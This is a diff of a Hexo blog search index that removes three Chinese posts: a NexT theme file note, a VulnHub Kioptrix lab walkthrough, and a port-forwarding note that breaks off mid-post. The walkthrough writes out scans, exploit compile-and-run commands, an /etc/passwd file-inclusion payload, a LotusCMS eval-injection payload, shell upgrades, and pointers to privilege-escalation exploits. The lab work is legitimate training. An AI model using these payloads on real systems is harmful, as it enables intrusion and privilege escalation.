@@ -1,359 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>next主题的自定义文件</title>
-    <url>/2026/02/09/next%E4%B8%BB%E9%A2%98%E7%9A%84%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>记录一下<code>hexo</code>的<code>next</code>主题的一些文件是在哪些位置，以防下次想改又要去找，至于怎么改，丢给文本模型跑就行了</p>
-<p><code>NexT version 8.21.1</code></p>
-<span id="more"></span>
-
-<h1 id="1-位置"><a href="#1-位置" class="headerlink" title="1-位置"></a>1-位置</h1><h2 id="1-自定义样式"><a href="#1-自定义样式" class="headerlink" title="1&gt;自定义样式"></a>1&gt;自定义样式</h2><p>next主题下面的<code>_config.yml</code></p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">custom_file_path:</span></span><br><span class="line">  <span class="comment">#head: source/_data/head.njk</span></span><br><span class="line">  <span class="comment">#header: source/_data/header.njk</span></span><br><span class="line">  <span class="comment">#sidebar: source/_data/sidebar.njk</span></span><br><span class="line">  <span class="comment">#postMeta: source/_data/post-meta.njk</span></span><br><span class="line">  <span class="comment">#postBodyStart: source/_data/post-body-start.njk</span></span><br><span class="line">  <span class="comment">#postBodyEnd: source/_data/post-body-end.njk</span></span><br><span class="line">  <span class="comment">#footer: source/_data/footer.njk</span></span><br><span class="line">  <span class="comment">#bodyEnd: source/_data/body-end.njk</span></span><br><span class="line">  <span class="comment">#variable: source/_data/variables.styl</span></span><br><span class="line">  <span class="comment">#mixin: source/_data/mixins.styl</span></span><br><span class="line">  <span class="comment">#style: source/_data/styles.styl</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#style: source/_data/styles.styl</span><br><span class="line">用于更改栏目的透明度、鼠标悬停时的效果、优化手机端的体验都可以从这里改</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#variable: source/_data/variables.styl</span><br><span class="line">圆角设置等</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#bodyEnd: source/_data/body-end.njk</span><br><span class="line">页面上新增标签按钮啥的</span><br></pre></td></tr></table></figure>
-
-<p>值得注意的是，<code>source/_data/body-end.njk</code>等这些是<code>blog</code>下面的<code>source</code>不是<code>next</code>主题下的<code>source</code></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">你博客的绝对路径\blog\source\_data\body-end.njk</span><br></pre></td></tr></table></figure>
-
-<p>其他的我没用到，暂时就不说了</p>
-<h2 id="2-固有的样式更改"><a href="#2-固有的样式更改" class="headerlink" title="2&gt;固有的样式更改"></a>2&gt;固有的样式更改</h2><h3 id="Hexo-NexT-主题侧边栏"><a href="#Hexo-NexT-主题侧边栏" class="headerlink" title="Hexo NexT 主题侧边栏"></a><code>Hexo NexT</code> 主题侧边栏</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">你博客的绝对路径\blog\themes\next\layout\_partials\sidebar\site-overview.njk</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="3-更新时间来排序"><a href="#3-更新时间来排序" class="headerlink" title="3&gt;更新时间来排序"></a>3&gt;更新时间来排序</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">你博客的绝对路径\blog\node_modules\hexo-generator-index\lib\generator.js</span><br></pre></td></tr></table></figure>
-
-<p>参考文章：<a href="https://hubojing.github.io/dhygztfl/">Hexo根据更新时间修改文章排序机制</a></p>
-<p>待续。。。</p>
-]]></content>
-      <categories>
-        <category>article</category>
-      </categories>
-      <tags>
-        <tag>article</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>oscp—vulnhub靶场训练</title>
-    <url>/2025/08/25/oscp_attack-log/</url>
-    <content><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1-前言"></a>1-前言</h2><p><strong>靶场</strong>：<a href="https://www.vulnhub.com/?q=Kioptrix">https://www.vulnhub.com/?q=Kioptrix</a></p>
-<p>注意网络联通问题:</p>
-<p>1&gt;网卡需要删除重建<code>.vmx</code>里面，要不然默认桥接</p>
-<p>2&gt;自建局域网宿主机为头即可<code>192.168.xx.1</code>，无需网关和<code>dns</code></p>
-<p>3&gt;可以用<code>centos7</code>虚拟机看一下会自动分配<code>ip</code>吗，如果分配的奇怪可能是因为没有打开<code>VMware DHCP Service</code>或<code>VMware NAT Service</code>，<code>192.168.xx.254</code>一般是<code>VM</code>的<code>DHCP</code>服务器，没有的话可能就是没开启<code>DHCP</code></p>
-<p><strong>工具</strong>：<code>searchsploit</code>(<code>kali</code>)，<a href="https://gitlab.com/exploit-database/">Exploit-DB</a>，<a href="https://github.com/peass-ng/PEASS-ng">扫描提权</a></p>
-<span id="more"></span>
-
-<p>准备条件(我用的是<code>wsl2</code>的<code>kali</code>)：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#kali系统</span><br><span class="line">kali-linux</span><br><span class="line"></span><br><span class="line">#必要的组件和更新	//运行exp</span><br><span class="line">sudo apt update &amp;&amp; sudo apt upgrade -y</span><br><span class="line">sudo apt install -y build-essential git curl wget unzip vim tmux <span class="built_in">net</span>-tools htop</span><br><span class="line">sudo apt install -y python3 python3-pip python3-venv</span><br><span class="line">sudo apt install -y openjdk-<span class="number">17</span>-jdk</span><br><span class="line">sudo apt install -y libssl-dev</span><br><span class="line">sudo apt install -y netcat-traditional socat tcpdump wireshark</span><br><span class="line">sudo apt install -y nmap traceroute dnsutils</span><br><span class="line">sudo apt install -y exploitdb sqlmap john hydra metasploit-framework</span><br><span class="line">以及其他自定义的必要组件</span><br></pre></td></tr></table></figure>
-
-<h1 id="Kioptrix"><a href="#Kioptrix" class="headerlink" title="Kioptrix"></a>Kioptrix</h1><h3 id="Kioptrix-Level-1"><a href="#Kioptrix-Level-1" class="headerlink" title="Kioptrix Level 1"></a>Kioptrix Level 1</h3><h5 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#快速扫描</span><br><span class="line">nmap -sn <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">#全端口扫描</span><br><span class="line">nmap -p <span class="number">1</span>-<span class="number">65535</span> -T4 -A -v <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span></span><br></pre></td></tr></table></figure>
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/1.png" alt="扫描的tcp连接内容"></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">---寻找低版本的框架或者容器查找[exp]---</span><br><span class="line">nikto -host <span class="number">192</span>.<span class="number">168</span>.xxx.xx</span><br><span class="line">nuclei -u <span class="number">192</span>.<span class="number">168</span>.xxx.xx</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/2-0.png" alt="扫描的tcp连接内容"></p>
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/2-1.png" alt="扫描的tcp连接内容"></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查找exp利用</span><br><span class="line">searchsploit mod_ssl</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/2.png" alt="扫描的tcp连接内容"></p>
-<p>对比可得3个可尝试exp</p>
-<hr>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#编译</span><br><span class="line">gcc -o exploit <span class="number">47080</span>.c -lcrypto</span><br><span class="line">#运行对应版本</span><br><span class="line">./exploit -h								#帮助</span><br><span class="line">./exploit | grep apache-<span class="number">1</span>.<span class="number">3</span>.<span class="number">20</span>				#版本</span><br><span class="line">./exploit <span class="number">0</span>x6b <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span> <span class="number">80</span> -c <span class="number">50</span>			#运行</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/3.png" alt="扫描的tcp连接内容"></p>
-<p>流程是这么个流程，但是这个exp太过于久远了，难以运行</p>
-<p>所以换其它的不需要lcrypto的exp运行</p>
-<h5 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#存在<span class="number">139</span>端口samba服务，且得知系统为linux框架</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/1.png" alt="扫描的tcp连接内容"></p>
-<p>搜索该服务：</p>
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/4-0.png" alt="扫描的tcp连接内容"></p>
-<p>发现非常多的exp，但是nmap没有版本，难不成这么多exp一个个试？</p>
-<p>有两种方法msfconsole&#x2F;nuclei跑出版本，msfconsole跑出版本前提是需要存在版本泄露的漏洞，虽然nuclei也是一样，但是架不住快呀:</p>
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/4-1.png" alt="扫描的tcp连接内容"></p>
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/4-2.png" alt="扫描的tcp连接内容"></p>
-<hr>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#或者nuclei直接跑出版本号</span><br><span class="line">nuclei.exe -u http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span>:<span class="number">139</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/4-3.png" alt="扫描的tcp连接内容"></p>
-<p>跑出版本2.2.1a就可以直接跑小于2.2.8这个版本的了</p>
-<p>直接编译运行即可</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#编译</span><br><span class="line">gcc <span class="number">10</span>.c -o samba_exp		#-o为输出文件</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/5.png" alt="扫描的tcp连接内容"></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查看帮助</span><br><span class="line">./samba_exp</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/5-2.png" alt="扫描的tcp连接内容"></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#运行</span><br><span class="line">./samba_exp -b0 <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span>	#-b为目标，<span class="number">0</span>为linux</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/6.png" alt="扫描的tcp连接内容"></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">找出版本后直接在msfconsole上搜索exp跑也可以</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_1/0.png" alt="扫描的tcp连接内容"></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">其他的服务版本都很低，可以信息搜集后用工具跑，低权限就uname -a查看内核版本，看searchsploit里面有无提权exp，或者直接cs上线跑提权工具</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
-
-<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>1.RCE前提是存在漏洞</p>
-<p>2.渗透主要是信息搜集</p>
-<p>3.主要考核了工具使用</p>
-<h4 id="参考的文章"><a href="#参考的文章" class="headerlink" title="参考的文章"></a>参考的文章</h4><p><a href="https://www.cnblogs.com/KUANTECH/p/17941528"><code>Lab 1-Vulnhub - Kioptix Level 1 - KUANTECH - </code>博客园</a></p>
-<hr>
-<h3 id="Kioptrix-Level-2"><a href="#Kioptrix-Level-2" class="headerlink" title="Kioptrix Level 2"></a>Kioptrix Level 2</h3><h5 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h5><p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_2/nmap-1.png" alt="信息搜集"></p>
-<h5 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#存在sql注入</span><br><span class="line">http://192.168.xxx.131/index.php</span><br><span class="line">#存在命令执行</span><br><span class="line">http://192.168.xxx.131/pingit.php</span><br></pre></td></tr></table></figure>
-
-<p>存在<code>web</code>权限，直接反弹<code>shell</code>，然后发现还有<code>gcc</code>、<code>wget</code>、<code>java</code>和<code>python</code>等环境齐全，通过<a href="https://github.com/peass-ng/PEASS-ng">扫描提权</a>，然后直接<a href="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/9435.tgz">工具</a>梭哈即可</p>
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_2/RCE-2.png" alt="命令执行"></p>
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_2/PrivEsc-1.png" alt="提权"></p>
-<h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><p>1.熟悉<code>owasp top 10</code>漏洞</p>
-<p>2.渗透测试的思路</p>
-<h3 id="Kioptrix-Level-3"><a href="#Kioptrix-Level-3" class="headerlink" title="Kioptrix Level 3"></a>Kioptrix Level 3</h3><p>注意：需要将下面的放到你的hosts文件内</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;ip&gt; kioptrix3.com	#靶场</span><br><span class="line"></span><br><span class="line">#C:\Windows\System32\drivers\etc\hosts</span><br><span class="line">#/etc/hosts</span><br></pre></td></tr></table></figure>
-
-<h5 id="信息搜集-2"><a href="#信息搜集-2" class="headerlink" title="信息搜集"></a>信息搜集</h5><p>测试：</p>
-<p>​	可以在网上搜<code>LotusCMS</code>的源码或者直接搜它的历史漏洞之类的，但是今天搜历史漏洞可以把它老底都暴光，搜源码，然后看对应接口长什么样子的，保证一定的公平性。</p>
-<p>index.php的源码如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;install.php&quot;</span>))&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: install.php&quot;</span>);	</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;core/lib/router.php&quot;</span>);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h5><h6 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h6><img src="../image/oscp-image-log/easy/Kioptrix_Level_3/源码-1.png" alt="php" style="zoom:60%;" />
-
-<p>​	如上图就加载了两个功能，第一个功能是安装，那主要功能肯定在<code>router.php</code>了，如下：<br><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-1.png" alt="php"></p>
-<p>​	可以得出一个通用的结论如果参数名是 <code>?system=</code>、<code>?page=</code>、<code>?file=</code> 或 <code>?view=</code>，很可能是文件包含；后端开发者通常使用这个参数来决定加载哪个模块（比如 <code>Admin.php</code>、<code>Login.php</code>），当然这是16年前的代码了，放在现在肯定行不通了。</p>
-<p>​	如下证明<code>php</code>是<code>5.2.4</code></p>
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/php%E7%89%88%E6%9C%AC%E7%89%B9%E6%80%A7.png" alt="php"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: http://&lt;ip:port&gt;/index.php?system=../../../../../../etc/passwd%001</span><br></pre></td></tr></table></figure>
-
-<p>​	目前很少看到 “<code>url</code>即<code>api</code>“ 了，大多都是网页 “<code>Hash</code>路由+其他域名<code>api</code>“ 的实现</p>
-<table>
-<thead>
-<tr>
-<th><strong>截断方式</strong></th>
-<th><strong>依赖环境</strong></th>
-<th><strong>现代防御状态</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>Null Byte (%00)</strong></td>
-<td>PHP &lt; 5.3.4</td>
-<td><strong>已失效</strong> (PHP 核心已加固)</td>
-</tr>
-<tr>
-<td><strong>Path Length</strong></td>
-<td>操作系统底层限制</td>
-<td><strong>极难实现</strong> (现代 PHP 会预校验)</td>
-</tr>
-<tr>
-<td><strong>RFI Query (?)</strong></td>
-<td>开启 URL 包含</td>
-<td><strong>已禁用</strong> (默认关闭 allow_url_include)</td>
-</tr>
-<tr>
-<td><strong>点号&#x2F;空格</strong></td>
-<td>旧版 Windows</td>
-<td><strong>已失效</strong></td>
-</tr>
-</tbody></table>
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E8%B6%85%E7%AE%A1%E5%AF%86%E7%A0%81-1.png" alt="php"></p>
-<h6 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h6><p>代码还是那一串(危险函数<code>eval()</code>)：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">public function Router()&#123;</span><br><span class="line">	//Get page request (<span class="keyword">if</span> any)</span><br><span class="line">	$page = $this-&gt;getInputString(&quot;page&quot;, &quot;index&quot;);</span><br><span class="line">	</span><br><span class="line">	//Get plugin request (<span class="keyword">if</span> any)</span><br><span class="line">	$plugin = $this-&gt;getInputString(&quot;system&quot;, &quot;Page&quot;);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(file_exists(&quot;core/plugs/&quot;.$plugin.&quot;Starter.php&quot;))&#123;</span><br><span class="line">		//Include Page fetcher</span><br><span class="line">		include(&quot;core/plugs/&quot;.$plugin.&quot;Starter.php&quot;);</span><br><span class="line"></span><br><span class="line">		//Fetch the page and get over loading cache etc...</span><br><span class="line">		eval(&quot;new &quot;.$plugin.&quot;Starter(&#x27;&quot;.$page.&quot;&#x27;);&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>原本拼接是：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?system=Admin</span><br><span class="line">拼接：</span><br><span class="line">eval(new AdminStarter(&#x27;index&#x27;);)</span><br><span class="line">注意，page是没有的话是默认的index</span><br></pre></td></tr></table></figure>
-
-<p>正常执行的<code>php</code></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
-
-<p>所以</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload:	/index.php?system=Page&amp;page=index&#x27;);phpinfo();/*</span></span><br><span class="line"><span class="comment">#拼接后的代码：</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;new PageStarter(&#x27;index&#x27;);phpinfo();/*&#x27;);&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#或者			/index.php?system=Page&amp;page=&#x27;.phpinfo().&#x27;</span></span><br><span class="line"><span class="comment">#更加优雅  &#x27;. phpinfo() .&#x27;  取代了   &quot;.$page.&quot; 完成一次解析然后会返回一个布尔值 true  真是优雅啊~！！</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;new PageStarter(&#x27;&#x27;.phpinfo().&#x27;&#x27;);&quot;</span>);</span><br><span class="line"><span class="comment">#想要传参就要解析.phpinfo().</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1.png" alt="RCE"></p>
-<h5 id="测试靶场"><a href="#测试靶场" class="headerlink" title="测试靶场"></a>测试靶场</h5><p>之后同理，反弹<code>shell</code>后提权，(好像<code>bash -i</code>用不了，<code>&gt;</code>用不了，<code>cd</code>用不了等等的，但是还好<code>wget</code>能用)</p>
-<p>利用文件包含执行代码：<br><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-2.png" alt="RCE"></p>
-<p>然后就遇到了一堆<code>exp</code>用不了的情况了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#寻找系统中配置错误且带有特殊权限的可执行文件。</span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第一步：调用 Python 启动 PTY</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># kali键盘全转发</span></span><br><span class="line">ctrl+z</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#找到当前目录下所有的root关键字</span></span><br><span class="line">grep -rnw <span class="string">&quot;.&quot;</span> -e <span class="string">&quot;password&quot;</span></span><br><span class="line">grep -C 5 <span class="string">&quot;password&quot;</span> gconfig.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/grep%E6%93%8D%E4%BD%9C-1.png" alt="RCE"></p>
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/grep%E6%93%8D%E4%BD%9C-2.png" alt="RCE"></p>
-<p>然后可以在<code>root</code>账户的数据库里找到其他两个账号，然后尝试用<code>ht</code>编辑器直接更改<code>/etc/passwd</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第1步：设置变量</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第2步：现在运行 ht 应该就能看到蓝色界面了</span></span><br><span class="line">/usr/local/bin/ht</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E7%BC%96%E8%BE%91%E5%99%A8ht.png" alt="RCE"></p>
-<p>或者直接使用<a href="https://www.exploit-db.com/exploits/40839">脏牛内核提权</a></p>
-<p>原理是条件竞争，使得数据直接写入了受保护的只读文件<code>/etc/passwd</code>，所以要稍微等一下，然后控制台需要正常一点</p>
-<p>注意：使用了脏牛<code>root</code>就会被覆盖了</p>
-<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_3/%E8%84%8F%E7%89%9B%E6%BC%8F%E6%B4%9E-1.png" alt="RCE"></p>
-<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.cnblogs.com/masses0x1/p/15780876.html">vulnhub KioptrixVM3 靶场练习&amp;LotusCMS漏洞分析 - rpsate - 博客园</a></p>
-<p><a href="https://www.freebuf.com/news/170656.html">CTF实战 | Kioptrix（#3）靶机渗透测试 - FreeBuf网络安全行业门户</a></p>
-<p><a href="https://blog.csdn.net/m0_73812072/article/details/155023122">渗透测试——Kioptrix3靶机多种方法渗透提权（脏牛漏洞提权，手把手详细教程）-CSDN博客</a></p>
-]]></content>
-      <categories>
-        <category>Cybersecurity</category>
-      </categories>
-      <tags>
-        <tag>Red team</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>代理记录</title>
-    <url>/2025/08/27/%E4%BB%A3%E7%90%86%E8%AF%A6%E8%A7%A3/</url>
-    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>​	今天琢磨端口映射的时候懒得输入内网地址，想直接用回显地址找到端口服务的时候硬是找不到</p>
-<h6 id="1-回显地址默认不经代理的解决办法"><a href="#1-回显地址默认不经代理的解决办法" class="headerlink" title="1&gt;回显地址默认不经代理的解决办法"></a>1&gt;回显地址默认不经代理的解决办法</h6><p><a href="https://stackoverflow.com/questions/57419408/how-to-make-firefox-use-a-proxy-server-for-localhost-connections#:~:text=You%20have%20to%20change%20another,in%20about%3Aconfig">stackoverflow网址中的解决办法</a></p>
-<p>简单来说就是进入浏览器的高级配置的首选项进行更改，主要原因在于浏览器的配置默认回显地址不经过代理，如下以火狐浏览器为例：</p>
-<p><img src="/../image/proxy-/1.png"></p>
-<span id="more"></span>
-
-<h1 id="1-局域网映射端口"><a href="#1-局域网映射端口" class="headerlink" title="1-局域网映射端口"></a>1-局域网映射端口</h1><h6 id="1-内网穿透-局域网端口映射"><a href="#1-内网穿透-局域网端口映射" class="headerlink" title="1&gt;内网穿透-&gt;局域网端口映射"></a>1&gt;内网穿透-&gt;局域网端口映射</h6><p>假设我连接了内网的wifi，然后访问它的web服务192.168.123.1:8080，现在我电脑开热点给其他人，让其他人访问内网的web服务，我怎么将192.168.123.1映射到我的热点（热点为nat模式）</p>
-<p>#<strong>解决方案</strong></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">##windows</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">8080</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">8080</span></span><br><span class="line">---</span><br><span class="line">#如果更多的端口映射</span><br><span class="line"><span class="comment">rem 映射Web服务 (HTTP)</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">80</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">80</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射HTTPS服务</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">443</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">443</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射远程桌面 (RDP)</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">3389</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">3389</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射SSH服务</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">22</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">22</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射你之前设置的8080端口</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">8080</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">8080</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射SMB文件共享</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">445</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">445</span></span><br><span class="line"></span><br><span class="line">##linux</span><br><span class="line">#启用IP转发（临时）</span><br><span class="line">sudo sysctl -w <span class="built_in">net</span>.ipv4.ip_forward=<span class="number">1</span></span><br><span class="line">#永久</span><br><span class="line">sudo nano /etc/sysctl.conf</span><br><span class="line">#更新</span><br><span class="line">sudo sysctl -p</span><br><span class="line"># 将目标为热点IP:<span class="number">8080</span>的包，转发到内网服务器</span><br><span class="line">sudo iptables -t nat -A PREROUTING -p tcp -i wlan1 --dport <span class="number">8080</span> -j DNAT --to-destination <span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span>:<span class="number">8080</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查看转发的表-windows</span><br><span class="line">netsh interface portproxy show all</span><br><span class="line">#删除对应的表</span><br><span class="line">netsh interface portproxy delete v4tov4 listenaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">123</span> listenport=<span class="number">8080</span></span><br><span class="line">#清除转发表</span><br><span class="line">netsh interface portproxy reset</span><br><span class="line">#增加对应的转发</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">123</span> listenport=<span class="number">8080</span> connectaddress=<span class="number">172</span>.<span class="number">16</span>.<span class="number">5</span>.<span class="number">2</span> connectport=<span class="number">8080</span></span><br></pre></td></tr></table></figure>
-
-<p>当然直接用<strong>Ngrok &#x2F; FRP (Fast Reverse Proxy) &#x2F; ew</strong>等穿透工具都可以</p>
-<p>无互联网开热点的解决方案如下：</p>
